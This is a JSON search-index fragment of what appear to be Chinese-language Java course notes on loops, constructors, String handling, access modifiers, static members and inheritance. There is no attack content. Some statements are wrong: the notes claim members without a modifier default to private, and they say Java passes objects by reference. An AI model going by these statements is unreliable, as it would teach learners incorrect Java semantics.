\u65f6</p>"},{"location":"cs/java/basics/w4/#empty-statements","title":"Empty statements","text":"<pre><code>public class EmptyStatement {\n    public static void main(String[] args) {\n        ;;; // Empty statements\n        int x = 10;\n        for (x = 0; x &lt; 3; x++);\n        System.out.println(\"x=\" + x);\n    }\n}\n</code></pre> <p>\u5728 for \u5faa\u73af\u4e2d\uff0c\u5206\u53f7\u8868\u793a\u5faa\u73af\u4f53\u4e3a\u7a7a\uff0c\u5faa\u73af\u7684\u6761\u4ef6\u6ee1\u8db3\u65f6\u5e76\u4e0d\u4f1a\u6267\u884c\u4efb\u4f55\u64cd\u4f5c\u3002</p> <p>\u5faa\u73af\u5b8c\u540e\uff0cx \u7684\u503c\u4f1a\u88ab\u6253\u5370\u51fa\u6765\u3002</p> <p>\u8fd9\u79cd\u5199\u6cd5\u5728\u9700\u8981\u7684\u60c5\u51b5\u4e0b\u4fdd\u6301\u4ee3\u7801\u7684\u7b80\u6d01\u6027\uff0c\u7279\u522b\u5728\u5faa\u73af\u4e2d\u4e0d\u9700\u8981\u4efb\u4f55\u989d\u5916\u64cd\u4f5c\u65f6\u3002</p> <pre><code>import java.util.Scanner;\n\npublic class EmptyForLoop {\n    public static void main(String[] args) {\n        Scanner sc = new Scanner(System.in);\n        int x = sc.nextInt();\n        for (; x &gt; 0; --x)\n            System.out.println(\"x=\" + x);\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w4/#for-each-loops","title":"For-Each loops","text":"<pre><code>for (int num : nums) {\n    System.out.println(num);\n}\n</code></pre>"},{"location":"cs/java/basics/w4/#continue","title":"Continue","text":"<p>continue ends execution early and goes to the next iteration</p> <pre><code>public class Continue {\n    public static void main(String[] args) {\n        for (int i = 1; i &lt;= 20; i++) {\n            if (i % 2 == 0)\n                continue;\n            System.out.println(i);\n        }\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w4/#oop","title":"OOP","text":"<p>\u540c\u4e00\u6587\u4ef6\u5939\u4e0b\u53ef\u4ee5\u81ea\u52a8\u8bc6\u522b\u8def\u5f84\uff0c\u5176\u4ed6\u6587\u4ef6\u8def\u5f84\u9700\u8981\u5bfc\u5165</p> <pre><code>javac BankExample.java\njava BankExample\n</code></pre> <p>\u7f16\u8bd1\u5668\u4f1a\u81ea\u52a8\u5bfb\u627e\u76f8\u5173 class \u6700\u7ec8\u76f4\u63a5\u6267\u884c Main \u6240\u5728\u7684 class \u5373\u53ef\u5f97\u5230\u7ed3\u679c</p>"},{"location":"cs/java/basics/w4/#return","title":"return","text":"<pre><code>class BankAccount3 {\n    String ownerName;\n    int balance;\n\n    void depositMoney(int amount) {\n        if (amount &lt; 0) {\n            System.out.println(\"You can't deposit a negative amount!\");\n            return;\n        }\n        balance += amount;\n    }\n}\n</code></pre> <p>return \u4f1a\u76f4\u63a5\u7ed3\u675f\u65b9\u6cd5\u7684\u6267\u884c\uff0c\u7c7b\u4f3c\u4e8e break</p>"},{"location":"cs/java/basics/w4/#constructor","title":"Constructor","text":"<pre><code>class BankAccount5 {\n    String ownerName;\n    int balance;\n\n    BankAccount5() {\n        ownerName = null;\n        balance = 0;\n    }\n}\n</code></pre> <p>\u7c7b\u5f53\u4f5c\u8bbe\u8ba1\u56fe\u7eb8\uff0c\u6a21\u5177\uff0c\u5bf9\u8c61 object / instance \u5f53\u4f5c\u5b9e\u9645\u5236\u9020\u51fa\u6765\u7684\u4e1c\u897f</p> <p>\u800c\u6784\u9020\u5668\u7528\u4e8e\u5bf9\u8c61\u7684\u521d\u59cb\u5316\u8fc7\u7a0b\uff0c\u5de5\u5382\u7528\u5176\u51c6\u5907\u597d\u521d\u59cb\u751f\u4ea7\u6b65\u9aa4</p> <ul> <li>new \u5173\u952e\u5b57\u521b\u5efa\u65b0\u5bf9\u8c61\u7684\u65f6\u5019\u88ab\u81ea\u52a8\u8c03\u7528</li> <li>\u53ef\u4ee5\u6709\u591a\u4e2a\u53c2\u6570\u4e0d\u540c\u7684 constructor</li> <li>\u6ca1\u6709\u8fd4\u56de\u7c7b\u578b</li> <li>\u6ca1\u5199 Java \u4e5f\u4f1a\u7ed9\u4f60\u4e00\u4e2a\u5565\u4e5f\u4e0d\u505a\u65e0\u53c2\u6570\u9690\u85cf\u7684\u9ed8\u8ba4\u6784\u9020\u5668\uff0c\u5199\u4e86\u5c31\u4e0d\u518d\u63d0\u4f9b</li> </ul>"},{"location":"cs/java/basics/w4/#this","title":"this","text":"<pre><code>class BankAccount6 {\n    String ownerName;\n    int balance;\n\n    BankAccount6(String ownerName, int balance) {\n        this.ownerName = ownerName;\n        this.balance = balance;\n    }\n}\n</code></pre> <p><code>this</code> \u5173\u952e\u8bcd\u7528\u4e8e\u533a\u5206 parameters \u548c field</p> <ul> <li>field \u5c31\u662f class \u7684\u5c5e\u6027</li> <li>parameters \u53c2\u6570</li> <li><code>this.name</code> always means a field; \u628a\u7528\u6237\u4f20\u7ecf\u6765\u7684\u53c2\u6570\u4fdd\u5b58\u5728\u5b57\u6bb5\u91cc</li> </ul>"},{"location":"cs/java/basics/w5/","title":"5.0 Class","text":""},{"location":"cs/java/basics/w5/#string-type","title":"String Type","text":"<p>String \u7c7b\u578b\u7528\u4e8e\u50a8\u5b58\u4e00\u4e32 char, \u5728 Java \u4e2d String \u4e0d\u662f\u4e00\u4e2a\u57fa\u672c\u6570\u636e\u7c7b\u578b\uff0c\u5c5e\u4e8e\u4e00\u4e2a class\uff0c\u56e0\u6b64\u8fd9\u610f\u5473\u7740 String \u7684\u6bcf\u4e2a instance \u90fd\u662f\u4e00\u4e2a\u5bf9\u8c61\u3002</p>"},{"location":"cs/java/basics/w5/#literal","title":"Literal","text":"<pre><code>String hi = \"hello\";\n</code></pre> <p>\u8fd0\u884c\u4e4b\u524d\u5c31\u5df2\u7ecf\u88ab\u7f16\u8bd1\u5668\u77e5\u9053\u5e76\u51c6\u5907\u597d\u4e86</p>"},{"location":"cs/java/basics/w5/#new","title":"New","text":"<pre><code>String s3 = new String(s);\n</code></pre> <p>String \u7c7b\u578b\u662f\u4e0d\u53ef\u53d8 immutable \u7684\uff0c\u4e00\u65e6\u88ab\u521b\u5efa\u51fa\u6765\uff0c\u5185\u5bb9\u5c31\u4e0d\u80fd\u88ab\u6539\u53d8</p> <p>\u867d\u7136\u6709\u4e9b\u65b9\u6cd5\u6bd4\u5982 <code>String s = \"Hello\" + \"World\";</code> \u4f1a\u8ba9\u4eba\u89c9\u5f97\u6539\u53d8\u4e86\u4f46\u662f\u5b9e\u9645\u4e0a\u5e76\u4e0d\u662f\u5728\u539f\u6709\u7684\u5bf9\u8c61\u4e0a\u4e0a\u8fdb\u884c\u4fee\u6539\u4e86 <code>s</code> \u800c\u662f\u521b\u5efa\u4e86\u4e00\u4e2a\u5168\u65b0\u7684 String \u5bf9\u8c61\u5b58\u653e\u7ed3\u679c\u3002\u90a3\u4e48\u5982\u679c\u5c31\u662f\u60f3\u50cf\u4fee\u6539\u6570\u7ec4\u4e00\u6837\u4fee\u6539\u5b57\u7b26\u7684\u67d0\u4e2a\u6570\u7ec4\uff0c\u5148\u5c06\u5176\u53d8\u4e3a\u4e00\u4e2a\u5b57\u7b26\u6570\u7ec4 <code>char[]</code></p> <ul> <li><code>toCharArray()</code></li> </ul> <p><code>return</code> \u4e00\u4e2a\u5b57\u7b26\u4e32\u526f\u672c</p> <p>\u6570\u7ec4\u53ef\u53d8\uff0c\u4fee\u6539\u5b8c\u6210\u540e\u53ef\u4ee5\u7528\u8fd9\u4e2a\u4fee\u6539\u8fc7\u540e\u7684\u5b57\u7b26\u6570\u7ec4\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 String \u5bf9\u8c61</p> <ul> <li><code>length()</code></li> </ul> <p>\u76f4\u63a5\u8fd4\u56de\u5b57\u7b26\u4e32\u4e2d\u5b57\u7b26\u7684\u6570\u91cf</p> <ul> <li><code>charAt(int index)</code></li> </ul> <p>\u83b7\u53d6\u4f4d\u4e8e\u7279\u5b9a\u7d22\u5f15\u7684\u5b57\u7b26\uff0c\u4ece 0 \u5f00\u59cb</p> <ul> <li><code>substring(int start, int end)</code> \u548c <code>substring(int start)</code></li> </ul> <p>\u8fd9\u4e9b\u65b9\u6cd5\u7528\u6765\u83b7\u53d6\u5b57\u7b26\u4e32\u7684\u5b50\u4e32\uff0c<code>end</code> \u4e0d\u5305\u542b</p> <pre><code>public class Substring {\n    public static void main(String[] args) {\n        String s = \"CITS2005\"; // \u539f\u59cb\u5b57\u7b26\u4e32\n        String cits = s.substring(0, 4);\n        String code = s.substring(4);\n        System.out.println(cits + \" -- \" + code); // CITS -- 2005\n    }\n}\n</code></pre> <ul> <li><code>equals(Object other)</code></li> </ul> <p>\u6bd4\u8f83\u5bf9\u8c61\u4e2d\u7684\u5185\u5bb9</p> <pre><code>public class ToCharArrayDemo {\n\n    public static void main(String[] args) {\n        String originalString = \"Hello World\";\n        char[] charArray = originalString.toCharArray();\n        System.out.println(\"\u4f7f\u7528 toCharArray() \u8f6c\u6362\u540e\u5f97\u5230\u7684\u5b57\u7b26\u6570\u7ec4 (\u5185\u5bb9): \" + new String(charArray)); // \u8f6c\u6362\u56de String\n        if (charArray.length &gt; 6) {\n            charArray[3] = '_';\n            System.out.println(\"\u4fee\u6539\u540e\u7684\u5b57\u7b26\u6570\u7ec4 (\u5185\u5bb9): \" + new String(charArray));\n        }\n        System.out.println(\"\u9a8c\u8bc1: \u539f\u59cb\u5b57\u7b26\u4e32 originalString \u4ecd\u7136\u662f: \" + originalString);\n\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w5/#mystring-class","title":"MyString Class","text":"<p>\u4e3a\u4e86\u66f4\u597d\u7684\u7406\u89e3 String\uff0c\u5f15\u5165\u4e00\u4e2a\u7ec3\u4e60\u5982\u4f55\u81ea\u5df1\u5b9e\u73b0\u4e00\u4e2a String \u7c7b</p> <ul> <li>\u6570\u7ec4\u662f <code>.length</code></li> <li><code>String</code> \u662f <code>.length()</code></li> </ul> <pre><code>public class MyString {\n    private char[] chars;\n\n    public MyString(char[] chars) {\n        this.chars = new char[chars.length];\n        for (int i = 0; i &lt; chars.length; i++) {\n            this.chars[i] = chars[i];\n        }\n    }\n\n    public char charAt(int index) {\n        return chars[index];\n    }\n\n    public int length() {\n        return chars.length;\n    }\n\n    public boolean equals(MyString s) {\n        // \u5148\u5bf9\u6bd4\u957f\u5ea6\uff0c\u518d\u9010\u4e2a\u5bf9\u6bd4 char[] \u4e2d\u5143\u7d20\n        if (length() != s.length())\n            return false;\n        for (int i = 0; i &lt; length(); i++) {\n            if (charAt(i) != s.charAt(i))\n                return false;\n        }\n        return true;\n    }\n\n    /**\n     * \u5c06\u539f\u59cb\u5b57\u7b26\u4e32\uff08\u6216\u5176\u5185\u90e8\u5b57\u7b26\u6570\u7ec4\uff09\u4e2d\u4ece start \u7d22\u5f15\u5f00\u59cb\n     * \u5230 end - 1 \u7d22\u5f15\u7ed3\u675f\u7684\u5b57\u7b26\uff0c\u9010\u4e00\u590d\u5236\u5230\u65b0\u521b\u5efa\u7684\u5b57\u7b26\u6570\u7ec4 (newChars) \u4e2d\u3002\n     */\n    public MyString substring(int start, int end) {\n        // 1. \u8ba1\u7b97\u6240\u9700\u7a7a\u95f4\uff0c\u751f\u6210\u4e00\u4e2a\u65b0\u7684 char[] \u7528\u4e8e\u8fd4\u56de\n        char[] newChars = new char[end - start];\n        // 2. \u5faa\u73af\u904d\u5386\uff0c\u4e0d\u5305\u542b end\uff0c\u8fd9\u4e2a\u7b97\u6cd5\u53ef\u4ee5\u52a8\u6001\u540c\u65f6\u6ee1\u8db3\u4e24\u8fb9\u7684\u9700\u6c42\n        for (int i = start; i &lt; end; i++) {\n            newChars[i - start] = chars[i]; // (2, 4) 3 - 2 = chars[3]\n        }\n        return new MyString(newChars);\n    }\n\n    public MyString concatenate(MyString s) {\n        char[] newChars = new char[chars.length + s.length()];\n        for (int i = 0; i &lt; chars.length; i++) {\n            newChars[i] = chars[i];\n        }\n        for (int i = 0; i &lt; s.length(); i++) {\n            newChars[chars.length + i] = s.charAt(i);\n        }\n        return new MyString(newChars); // \u7531\u4e8e\u4e0d\u662f static \u8981\u751f\u6210\u5bf9\u8c61\n    }\n\n    public class MyStringExample {\n        public static void main(String[] args) {\n            MyString s = new MyString(\"Hello\".toCharArray());\n            s.chars[0] = 'J';\n            for (int i = 0; i &lt; s.length(); i++)\n                System.out.println(s.charAt(i));\n        }\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w5/#private-and-public","title":"Private and Public","text":"<p>\u8f6f\u4ef6\u5de5\u7a0b\u4e24\u5927\u51c6\u5219\uff1a</p> <ul> <li>data hiding</li> <li>\u7528 <code>private</code> \u5b9e\u73b0</li> <li>encapsulation</li> <li>\u628a\u4ee3\u7801\u548c\u6570\u636e\u6253\u5305\u6210\u5bb9\u6613\u4f7f\u7528\u7684\u5bf9\u8c61\uff0c\u8fd9\u5c31\u662f\u4e00\u4e2a\u7c7b\u3002\u6570\u636e\u9690\u85cf\u53ef\u4ee5\u4fdd\u62a4\u7528\u6237\u4e0d\u53d7\u590d\u6742\u6027\u7684\u5f71\u54cd\uff0c\u4ed6\u4eec\u53ea\u9700\u8981\u4e86\u89e3\u516c\u5171\u90e8\u5206\u5c31\u53ef\u4ee5\u4e86\u3002\u8fd9\u5c31\u53eb\u5c01\u88c5\u3002</li> </ul> <pre><code>public class SafeArray {\n    private int size;\n    private int[] array;\n\n    public SafeArray(int size) {\n        this.size = size;\n        this.array = new int[size];\n    }\n\n    private boolean isValidIndex(int index) {\n        return index &gt;= 0 &amp;&amp; index &lt; size;\n    }\n\n    public int get(int index) {\n        if (isValidIndex(index))\n            return array[index];\n        System.out.println(\"Invalid index: \" + index);\n        return 0;\n    }\n\n    public void set(int index, int value) {\n        if (isValidIndex(index))\n            array[index] = value;\n        else\n            System.out.println(\"Invalid index: \" + index);\n    }\n}\n</code></pre> <p>\u7528 <code>void</code> <code>set</code> \u4ee5\u53ca <code>get</code> \u5b9e\u73b0\u6709\u9650\u5ea6\u7684 <code>public</code> \u8bbf\u95ee\u673a\u5236</p>"},{"location":"cs/java/basics/w5/#pass-by-reference","title":"Pass by reference","text":"<ul> <li>\u4e0a\u6b21\u8bfe\u6211\u4eec\u770b\u5230\u4e86\u65b9\u6cd5\u548c\u6784\u9020\u51fd\u6570\u53ef\u4ee5\u6709\u53c2\u6570\uff0c\u8fd9\u4e9b\u53c2\u6570\u53ef\u4ee5\u662f\u7c7b</li> <li>\u8fd9\u610f\u5473\u7740\u4f20\u9012\u8fdb\u6765\u7684\u503c\u662f\u5bf9\u8c61</li> <li>\u8981\u7406\u89e3\u8fd9\u662f\u600e\u4e48\u5de5\u4f5c\u7684\uff0c\u6211\u4eec\u9700\u8981\u77e5\u9053\u503c\u4f20\u9012\u548c\u5f15\u7528\u4f20\u9012</li> <li>\u6211\u4eec\u5df2\u7ecf\u770b\u5230\uff0c\u5b58\u50a8\u5bf9\u8c61\u7684\u53d8\u91cf\uff08\u6216\u6570\u7ec4\uff09\u5b9e\u9645\u4e0a\u5b58\u50a8\u7684\u662f\u5f15\u7528</li> <li>\u5b58\u50a8\u539f\u59cb\u7c7b\u578b\u7684\u53d8\u91cf\u76f4\u63a5\u5b58\u50a8\u503c</li> <li>\u8fd9\u662f\u4e00\u6837\u7684\u3002\u539f\u59cb\u7c7b\u578b\u7684\u503c\u4f1a\u88ab\u590d\u5236\uff08\u503c\u4f20\u9012\uff09\uff0c\u5bf9\u8c61\u5219\u4f1a\u88ab\u5f15\u7528\uff08\u5f15\u7528\u4f20\u9012\uff09</li> <li>\u8fd9\u5f88\u6709\u9053\u7406\u3002\u539f\u59cb\u7c7b\u578b\u901a\u5e38\u590d\u5236\u8d77\u6765\u66f4\u9ad8\u6548\uff08\u6bd4\u5982\u4e00\u4e2a int\uff09\uff0c\u4f46\u5bf9\u8c61\u901a\u5e38\u8981\u5927\u5f97\u591a</li> </ul> <pre><code>public void copyInto(SafeArray other) {\n    if (other.size != size) {\n        System.out.println(\"Arrays are not the same size\");\n        return;\n    }\n    for (int i = 0; i &lt; size; i++) {\n        other.array[i] = array[i];\n    }\n}\n</code></pre> <p>\u4f20\u9012\u4e86\u4e00\u4e2a <code>SafeArray</code> \u7c7b\u578b\u7684\u6570\u7ec4\u5bf9\u8c61\uff0c\u786e\u4fdd\u5927\u5c0f\u4e00\u81f4\u540e\u5f00\u59cb\u5c06\u8f93\u5165\u5bf9\u8c61\u6570\u7ec4\u66ff\u6362</p> <p><code>public</code> \u65b9\u6cd5\u4e00\u6837\u53ef\u4ee5\u63a5\u5165 <code>private</code> \u53d8\u91cf\uff0c\u53ea\u8981\u662f\u5728\u540c\u4e00\u4e2a\u7c7b\u4e2d</p>"},{"location":"cs/java/basics/w5/#return-by-reference","title":"Return by reference","text":"<pre><code>public SafeArray append(int value) {\n    SafeArray newArray = new SafeArray(size + 1);\n    for (int i = 0; i &lt; size; i++)\n        newArray.array[i] = array[i];\n    newArray.array[size] = value;\n    return newArray;\n}\n</code></pre> <p>\u5b9e\u73b0\u4e00\u4e2a\u548c <code>python</code> \u4e00\u6837\u7684 <code>append</code> \u65b9\u6cd5\u9700\u8981\u8003\u8651\u5185\u5b58\uff0c\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\u5730\u5740</p>"},{"location":"cs/java/basics/w5/#overloading","title":"Overloading","text":"<ul> <li>\u5728 Java \u91cc\uff0c\u597d\u51e0\u79cd\u65b9\u6cd5\u53ef\u4ee5\u53eb\u540c\u4e00\u4e2a\u540d\u5b57\u3002</li> <li>\u8fd9\u5c31\u662f\u6240\u8c13\u7684\u91cd\u8f7d\u3002</li> <li>\u53ea\u8981\u5b83\u4eec\u7684\u53c2\u6570\u4e0d\u4e00\u6837\uff0cJava \u5c31\u80fd\u77e5\u9053\u4f60\u60f3\u8c03\u7528\u54ea\u4e2a\u3002</li> </ul> <p>\u6bd4\u5982\u8bf4\u5982\u679c\u4e0d\u8fd4\u56de\u5bf9\u8c61\u518d\u5efa\u7acb\u4e00\u4e2a <code>void</code> \u540c\u540d\u51fd\u6570 <code>append</code></p> <p>\u6bd4\u5982\u5efa\u7acb\u4e00\u4e2a\u4e0d\u540c\u53c2\u6570\u7684 constructor, \u90fd\u53ef\u4ee5\u88ab\u81ea\u52a8\u8bc6\u522b</p>"},{"location":"cs/java/basics/w5/#recursion","title":"Recursion","text":"<pre><code>public class Fibonacci {\n    public static void main(String[] args) {\n        Fibonacci f = new Fibonacci();\n        for (int i = 1; i &lt;= 10; i++)\n            System.out.println(f.fib(i));\n    }\n\n    public int fib(int n) {\n        if (n &lt;= 2)\n            return 1;\n        else\n            return fib(n - 1) + fib(n - 2);\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w5/#static","title":"static","text":"<p>\u8be5\u7279\u6b8a\u5b57\u7b26\u53ea\u5c5e\u4e8e\u7c7b\uff0c\u4e0d\u5c5e\u4e8e\u5bf9\u8c61</p> <p><code>ClassName.myStaticMethod</code></p> <pre><code>public class StaticFib {\n    public static void main(String[] args) {\n        for (int i = 1; i &lt;= 10; i++)\n            System.out.println(StaticFib.fib(i));\n    }\n\n    public static int fib(int n) {\n        if (n &lt;= 2)\n            return 1;\n        else\n            return fib(n - 1) + fib(n - 2);\n    }\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u7b2c 4 \u884c\u76f4\u63a5\u8c03\u7528\u7684\u662f\u7c7b\u540d\uff0c\u5982\u679c\u4e0d\u5199\u7c7b\u540d\u76f4\u63a5\u7528 <code>fib(i)</code> \u81ea\u52a8\u67e5\u8be2\u5f53\u524d\u7c7b\u662f\u5426\u6709\u8be5\u65b9\u6cd5</p>"},{"location":"cs/java/basics/w5/#static-fields","title":"Static Fields","text":"<pre><code>public class StaticX {\n    public static String x;\n}\n</code></pre> <p><code>StaticX.x</code> \u4e5f\u662f\u8fd9\u6837\u8bbf\u95ee</p> <p>\u65e0\u8bba\u4f60\u521b\u5efa\u591a\u5c11\u4e2a\u8be5\u7c7b\u7684\u5bf9\u8c61\uff0c\u6216\u8005\u6839\u672c\u4e0d\u521b\u5efa\u5bf9\u8c61\uff0c\u8fd9\u4e2a\u9759\u6001\u5b57\u6bb5\u90fd\u53ea\u6709\u4e00\u4efd\u5b58\u50a8\u7a7a\u95f4\uff0c\u5b58\u5728\u4e8e\u7c7b\u7ea7\u522b\u3002\u4e0d\u50cf\u5b9e\u4f8b\u5b57\u6bb5\uff0c\u6bcf\u4e2a\u5bf9\u8c61\u90fd\u6709\u81ea\u5df1\u7684\u90a3\u4e00\u4efd\u3002\u6240\u6709\u5b9e\u4f8b\u90fd\u5171\u4eab\u540c\u4e00\u4e2a\u5b57\u6bb5\uff1a\u56e0\u4e3a\u9759\u6001\u5b57\u6bb5\u53ea\u6709\u4e00\u4efd\u3002</p> <pre><code>public class StaticXTest {\n    public static void main(String[] args) {\n        StaticX instance = new StaticX();\n        StaticX instance2 = new StaticX();\n        instance.x = \"Hello\";\n        instance2.x = \"Goodbye\";\n        StaticX.x = \"World\";\n        System.out.println(StaticX.x + \" \" + instance.x + \" \" + instance2.x);\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w6/","title":"6.0 Inheritance","text":""},{"location":"cs/java/basics/w6/#inheritance","title":"Inheritance","text":"<ul> <li>code reuse and abstraction</li> <li>A subclass inherits all the members (fields and methods, not constructors) of its superclass</li> </ul>"},{"location":"cs/java/basics/w6/#basicsafearray","title":"BasicSafeArray","text":"<pre><code>public class BasicSafeArray {\n    protected int size;\n    protected int[] array;\n\n    public BasicSafeArray(int size) {\n        // see full code\n    }\n\n    public int size() {\n        // see full code\n    }\n\n    protected boolean isValidIndex(int index) {\n        // see full code\n    }\n\n    public int get(int index) {\n        // see full code\n    }\n\n    public void set(int index, int value) {\n        // see full code\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w6/#appendablesafearray","title":"AppendableSafeArray","text":"<pre><code>public class AppendableSafeArray extends BasicSafeArray {\n    // Constructor\n    AppendableSafeArray(int size) {\n        super(size);\n    }\n\n    // Method to append a value\n    public void append(int value) {\n        int newSize = size + 1;\n        int[] newArray = new int[newSize];\n\n        // Copying old array elements to new array\n        for (int i = 0; i &lt; size; i++) {\n            newArray[i] = array[i];\n        }\n\n        // Adding the new value\n        newArray[size] = value;\n\n        // Updating size and array reference\n        size = newSize;\n        array = newArray;\n    }\n\n    // Main method for testing\n    public static void main(String[] args) {\n        AppendableSafeArray safeArray = new AppendableSafeArray(5);\n        safeArray.append(10);\n        // You can add more test cases here\n    }\n}\n</code></pre> <ul> <li>\u7528 <code>extends</code> \u5173\u952e\u8bcd\u7ee7\u627f\u975e <code>private</code> \u65b9\u6cd5\u4e0e\u5b57\u6bb5</li> <li>\u7b2c\u4e09\u884c\u53ef\u4ee5\u770b\u5230\u9700\u8981\u81ea\u5df1\u91cd\u5199 <code>constructor</code> </li> <li>\u4f7f\u7528 <code>super</code> \u8c03\u7528\u7236\u7c7b <code>constructor</code> \u5b9e\u73b0\u521d\u59cb\u5316 <code>field size</code> </li> </ul>"},{"location":"cs/java/basics/w6/#protected","title":"protected","text":"<p><code>protected</code>is similar to private, but can be accessed by subclasses</p> <p>\u4f46\u662f\u6709\u4e00\u4e9b\u4f8b\u5916\uff0c\u8ba8\u8bba\u5305\u65f6\u518d\u8be6\u7ec6\u8ba8\u8bba\uff0c\u53e6\u5916\u7c7b\u3001\u65b9\u6cd5\u3001\u5b57\u6bb5\u5982\u679c\u4e0d\u5199\u6743\u9650\u9ed8\u8ba4\u79c1\u6709</p>"},{"location":"cs/java/basics/w6/#field-initialisation","title":"Field Initialisation","text":"<p>\u5373\u4f7f\u6ca1\u6709 <code>constructor</code>\u624b\u52a8\u521d\u59cb\u5316 Java \u4e5f\u4f1a\u81ea\u52a8\u52a0\u4e00\u4e2a\uff0c\u56e0\u6b64\u6253\u5370\u51fa\u6765\u5b57\u6bb5\u503c\u662f\u96f6</p> <ul> <li>\u5b57\u6bb5\u7684\u5de5\u4f5c\u65b9\u5f0f\u548c\u6570\u7ec4\u5dee\u4e0d\u591a\u3002\u5728\u5bf9\u8c61\u6784\u5efa\u4e4b\u524d\uff0c\u5b83\u4eec\u4f1a\u88ab\u521d\u59cb\u5316\u6210\u4e00\u4e9b\u9ed8\u8ba4\u503c</li> <li>\u6240\u6709\u6570\u503c\u7c7b\u578b\uff08\u6bd4\u5982<code>int\u3001long\u3001char\u3001double\u3001float</code> \u7b49\u7b49\uff09\u90fd\u4f1a\u88ab\u521d\u59cb\u5316\u6210\u96f6</li> <li>\u5e03\u5c14\u503c\u4f1a\u88ab\u8bbe\u7f6e\u4e3a <code>false</code></li> <li>\u5bf9\u8c61\u548c\u6570\u7ec4\u4f1a\u88ab\u8bbe\u7f6e\u4e3a <code>null</code></li> </ul>"},{"location":"cs/java/basics/w6/#superclass-constructors","title":"Superclass Constructors","text":"<pre><code>public class AppendableSafeArray extends BasicSafeArray {\n    AppendableSafeArray(int size) {\n        this.size = size;\n        this.array = new int[size];\n    }\n}\n</code></pre> <pre><code>AppendableSafeArray.java:2: error: constructor BasicSafeArray in\nclass BasicSafeArray cannot be applied to given types; ... etc\n</code></pre> <ul> <li>Java \u6709\u4e2a\u89c4\u77e9\uff1a\u5f53\u4f60\u521b\u5efa\u5b50\u7c7b\u5b9e\u4f8b\u65f6\uff0c\u5b83\u5fc5\u987b\u5148\u53bb\u8c03\u7528\u7236\u7c7b\u7684\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u6765\u5b8c\u6210\u7236\u7c7b\u90e8\u5206\u7684\u521d\u59cb\u5316\u3002\u5982\u679c\u4f60\u4e0d\u660e\u786e\u544a\u8bc9\u5b83\u8c03\u7528\u54ea\u4e2a\uff0cJava \u5c31\u9ed8\u8ba4\u53bb\u8c03\u7528\u7236\u7c7b\u7684\u65e0\u53c2\u6570\u6784\u9020\u51fd\u6570\uff08\u5c31\u662f <code>BasicSafeArray()</code> \u8fd9\u79cd\u62ec\u53f7\u91cc\u5565\u4e5f\u6ca1\u6709\u7684\uff09\u3002</li> <li>\u8fd9\u6bb5\u4ee3\u7801\u91cc\u7684\u7236\u7c7b <code>BasicSafeArray</code> \u5f88\u53ef\u80fd\u6ca1\u6709\u63d0\u4f9b\u4e00\u4e2a\u65e0\u53c2\u6570\u7684\u6784\u9020\u51fd\u6570\uff0c\u6216\u8005\u5b83\u6709\u4e00\u4e2a\u9700\u8981\u53c2\u6570\u7684\u6784\u9020\u51fd\u6570\uff0c\u5bfc\u81f4 Java \u627e\u4e0d\u5230\u5b83\u60f3\u9ed8\u8ba4\u8c03\u7528\u7684\u90a3\u4e2a <code>BasicSafeArray()</code>\u3002\u6240\u4ee5\u5c31\u62a5\u9519\u8bf4\uff1a\u201c\u7236\u7c7b\u7684\u6784\u9020\u51fd\u6570\u6ca1\u6cd5\u7528\u554a\uff01\u201d</li> <li>\u4e3a\u4e86\u89e3\u51b3\u4e0a\u9762\u7684\u95ee\u9898\uff0c\u4f60\u53ef\u4ee5\u5728\u7236\u7c7b <code>BasicSafeArray</code> \u91cc\u9762\u660e\u786e\u5730\u6dfb\u52a0\u4e00\u4e2a\u65e0\u53c2\u6570\u7684\u6784\u9020\u51fd\u6570</li> </ul> <pre><code>public BasicSafeArray() {\n    this(0);\n}\n</code></pre> <ul> <li><code>this(0);</code> \u7279\u6b8a\u7528\u6cd5\uff0c\u5c31\u662f\u53bb\u8c03\u7528\u540c\u4e00\u4e2a\u7c7b <code>BasicSafeArray</code> \u4e2d\u90a3\u4e2a\u9700\u8981\u4e00\u4e2a\u6574\u6570\uff08\u8fd9\u91cc\u662f0\uff09\u4f5c\u4e3a\u53c2\u6570\u7684\u6784\u9020\u51fd\u6570\u3002\u8fd9\u662f\u4e00\u79cd\u5e38\u89c1\u7684\u6280\u5de7\uff0c\u7528\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u53bb\u8c03\u7528\u53e6\u4e00\u4e2a\uff0c\u907f\u514d\u4ee3\u7801\u91cd\u590d\u3002</li> <li>\u5982\u679c\u4f60\u5728\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u91cc\u60f3\u7528 <code>this(...)</code>\uff08\u8c03\u7528\u81ea\u5df1\u7c7b\u7684\u5176\u4ed6\u6784\u9020\u51fd\u6570\uff09\u6216\u8005 <code>super(...)</code>\uff08\u8c03\u7528\u7236\u7c7b\u7684\u6784\u9020\u51fd\u6570\uff09\uff0c\u90a3\u4e48\u8fd9\u53e5\u8c03\u7528\u5fc5\u987b\u5199\u5728\u8fd9\u4e2a\u6784\u9020\u51fd\u6570\u7684\u7b2c\u4e00\u884c\uff01\u4e0d\u80fd\u5728\u5b83\u524d\u9762\u5199\u4efb\u4f55\u5176\u4ed6\u7684\u4ee3\u7801</li> </ul>"},{"location":"cs/java/basics/w6/#hiding-memebrs","title":"Hiding Memebrs","text":"<ul> <li>super \u6765\u8bbf\u95ee\u8d85\u7c7b\u7684\u6784\u9020\u51fd\u6570\u3001\u6210\u5458\u53d8\u91cf\u6216\u65b9\u6cd5</li> <li>\u5728\u4f60\u60f3\u8986\u76d6\u5b50\u7c7b\u4e2d\u9690\u85cf\u7684\u5b57\u6bb5\u6216\u65b9\u6cd5\u65f6\u5f88\u6709\u7528</li> <li>\u5982\u679c\u6211\u4eec\u5b50\u7c7b\u4e2d\u91cd\u65b0\u58f0\u660e\u4e86\u4e00\u4e2a\u5b57\u6bb5\u6216\u65b9\u6cd5\uff0c\u5b83\u4f1a\u9690\u85cf\u4ece\u7236\u7c7b\u7ee7\u627f\u7684\u6210\u5458</li> 